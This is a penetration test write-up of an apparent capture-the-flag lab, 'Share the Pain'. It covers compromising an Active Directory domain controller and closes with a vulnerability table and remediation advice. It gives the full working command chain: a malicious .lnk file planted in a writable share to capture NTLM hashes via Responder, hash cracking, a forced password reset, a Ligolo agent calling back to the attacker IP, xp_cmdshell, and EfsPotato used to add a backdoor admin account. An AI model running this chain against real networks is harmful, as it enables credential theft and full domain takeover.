---
{"dg-publish":true,"permalink":"/share-the-pain/","dg-note-properties":{}}
---


# Share the Pain — Penetration Test Report

---

| Field | Value |
|---|---|
| **Date** | 2026-08-09 |
| **Tester** | Eleni Tsermentseli |
| **Domain** | `hack.smarter` |
| **Target** | `10.1.116.55` (DC01.hack.smarter) |
| **Difficulty** | Easy |
| **Scenario** | Black Box — No credentials provided |

---

## Enumeration

### Nmap

Ran a full port scan against the target:

```shell
nmap -p- 10.1.116.55 -T4 --min-rate 5000 | grep open
```

Identified a classic Active Directory Domain Controller:

- **88** — Kerberos
- **135/139/445** — SMB (signing: **True**)
- **389** — LDAP (Domain: `hack.smarter`)
- **464** — Kpasswd5
- **593** — HTTP-RPC-EPMAP
- **636** — LDAPSSL
- **3389** — RDP
- **5985/47001** — WinRM

Key findings:
- Domain: `hack.smarter`
- DC hostname: `DC01.hack.smarter`
- OS: Windows Server 2022 (Build 20348)

---

## User Enumeration

### SMB — Null Session & RID Brute Force

Attempted anonymous SMB enumeration:

```shell
smbclient -L //10.1.116.55 -N
impacket-lookupsid hack.smarter/guest@10.1.116.55 -no-pass
```

Anonymous SMB login succeeded. RID brute force enumerated all domain users:

| RID | Account |
|---|---|
| 500 | `Administrator` |
| 501 | `Guest` |
| 502 | `krbtgt` |
| 1103 | `bob.ross` |
| 1104 | `alice.wonderland` |
| 1105 | `tyler.ramsey` |

Also discovered a **writable SMB share**:

```
Share           Permissions
-----           -----------
Share           READ, WRITE  ← Anonymous write access!
```

---

## ASREPRoasting & Kerberoasting

Tested all discovered users — no ASREPRoastable accounts found. No Kerberoastable SPNs found without credentials.

---

## NTLM Hash Capture (NTLM Theft via SMB Share)

### Generating Malicious Files

Used **ntlm_theft** to generate a malicious `.lnk` file that triggers NTLM authentication when viewed:

```shell
cd ~/ntlm_theft
python3 ntlm_theft.py -g lnk -s 10.200.79.101 -f sharethepain
```

### Starting Responder

```shell
sudo responder -I tun0
```

### Uploading to Share

Uploaded the malicious `.lnk` to the anonymous-writable `Share`:

```shell
smbclient //10.1.116.55/Share -U 'hack.smarter/guest%' \
  -c 'put sharethepain/sharethepain.lnk sharethepain.lnk'
```

### Capturing the Hash

When `bob.ross` browsed the Share folder, Windows automatically attempted to resolve the `.lnk` shortcut — sending the NTLMv2 authentication request to our Responder listener:

```
[SMB] NTLMv2-SSP Username : HACK\bob.ross
[SMB] NTLMv2-SSP Hash     : bob.ross::HACK:77990b8d27be9dc8:...
```

### Cracking the Hash

```shell
hashcat -a 0 -m 5600 bobross.hash /usr/share/wordlists/rockyou.txt
```

**Password found:** `137Password123!@#`

Credentials: `bob.ross:137Password123!@#`

---

## BloodHound Enumeration

```shell
bloodhound-python -d hack.smarter -u bob.ross \
  -p '137Password123!@#' -ns 10.1.116.55 -c DCOnly --zip
```

### Attack Path Identified

```
bob.ross
    ↓ ForceChangePassword → alice.wonderland
alice.wonderland → WinRM (Pwn3d!)
    ↓ Local MSSQL (localhost:1433)
MSSQL xp_cmdshell → SeImpersonatePrivilege
    ↓ EfsPotato
hacker (Local Admin)
    ↓ evil-winrm via Ligolo-ng tunnel
root.txt
```

---

## ACL Abuse — bob.ross → alice.wonderland

`bob.ross` had **ForceChangePassword** over `alice.wonderland`. Reset the password:

```shell
net rpc password 'alice.wonderland' 'Pwned123@!' \
  -U 'hack.smarter/bob.ross%137Password123!@#' -S 10.1.116.55
```

Confirmed WinRM access:

```shell
netexec winrm 10.1.116.55 -u 'alice.wonderland' -p 'Pwned123@!'
# [+] hack.smarter\alice.wonderland:Pwned123@! (Pwn3d!)
```

### User Flag

```shell
evil-winrm -i 10.1.116.55 -u 'alice.wonderland' -p 'Pwned123@!'
type C:\Users\alice.wonderland\Desktop\user.txt
```

> **Flag:** `WFkZV9pdF90aGlzX2Zhcgo=`

---

## Internal Port Discovery

Inside the WinRM shell, discovered MSSQL running on localhost only:

```powershell
netstat -ano | findstr 1433
# TCP    127.0.0.1:1433    0.0.0.0:0    LISTENING
```

MSSQL was not externally accessible — port forwarding required.

---

## Port Forwarding — Ligolo-ng

### Setup on Kali

```shell
# Create TUN interface
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo

# Start proxy
./proxy -selfcert
```

### Upload and Execute Agent

Uploaded the Ligolo agent via Evil-WinRM:

```powershell
upload agent.exe
.\agent.exe -connect 10.200.79.101:11601 --ignore-cert
```

### Start Tunnel (Ligolo Proxy)

```
session → select session → start
```

MSSQL was now accessible at `240.0.0.1:1433`.

---

## MSSQL — xp_cmdshell & SeImpersonatePrivilege

Connected to MSSQL as `alice.wonderland`:

```shell
impacket-mssqlclient 'hack.smarter/alice.wonderland:Pwned123@!'@240.0.0.1 -windows-auth
```

Enabled `xp_cmdshell`:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
-- Output: nt service\mssql$sqlexpress
```

The MSSQL service account ran as `NT SERVICE\MSSQL$SQLEXPRESS` which holds **SeImpersonatePrivilege**.

---

## Privilege Escalation — EfsPotato

### Compile EfsPotato

Uploaded the source code and compiled on target:

```powershell
# Upload EfsPotato.cs via Evil-WinRM
upload EfsPotato.cs

# Move to writable directory
move EfsPotato.cs C:\Temp\EfsPotato.cs

# Grant MSSQL read access
cmd /c 'icacls C:\Temp\EfsPotato.cs /grant "NT SERVICE\MSSQL$SQLEXPRESS:(R)"'
```

Compiled via xp_cmdshell:

```sql
EXEC xp_cmdshell 'C:\Windows\Microsoft.Net\Framework64\v4.0.30319\csc.exe \
  -nowarn:1691,618 -out:C:\Temp\EfsPotato.exe C:\Temp\EfsPotato.cs';
```

### Execute EfsPotato

Created a local admin user by exploiting `SeImpersonatePrivilege`:

```sql
EXEC xp_cmdshell 'C:\Temp\EfsPotato.exe \
  "cmd.exe /c net user hacker Hacked123! /add && \
   net localgroup administrators hacker /add"';
```

Output:
```
[+] Current user: NT Service\MSSQL$SQLEXPRESS
[+] Get Token: 872
[+] Process created.
The command completed successfully.
```

---

## Shell as Local Admin

Connected via Evil-WinRM through the Ligolo tunnel:

```shell
evil-winrm -i 240.0.0.1 -u 'hacker' -p 'Hacked123!'
```

### Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

> **Flag:** `YWxsIGFib3V0IHRoYXQgcm9vdCwgYm91dCB0aGF0IHJvb3QsIEpVU1QgREEK`

---

## Vulnerabilities Summary

| # | Vulnerability | Severity | Impact |
|---|---|---|---|
| 1 | Anonymous write access to SMB Share | High | NTLM hash capture |
| 2 | Weak password on `bob.ross` | High | Domain user credential access |
| 3 | Excessive ACL — ForceChangePassword (bob.ross → alice.wonderland) | High | Lateral movement |
| 4 | MSSQL `xp_cmdshell` enabled | High | OS command execution |
| 5 | MSSQL service running with SeImpersonatePrivilege | High | Local privilege escalation |
| 6 | EfsPotato (CVE-2021-36942) viable — unpatched | Critical | SYSTEM-level code execution |

---

## Remediation Recommendations

- **Restrict SMB share permissions** — remove anonymous write access; require authenticated access only
- **Enforce strong password policy** — prevent weak/guessable passwords across all accounts
- **Review AD ACLs** — remove ForceChangePassword permissions not explicitly required by IT processes
- **Disable xp_cmdshell** — this feature should never be enabled in production environments
- **Restrict MSSQL service privileges** — run under a gMSA or low-privilege account without SeImpersonatePrivilege
- **Apply MS-EFSR patches** — ensure CVE-2021-36942 and related EfsRpc patches are applied
- **Network segmentation** — internal services like MSSQL should not be reachable from standard user accounts via WinRM

---
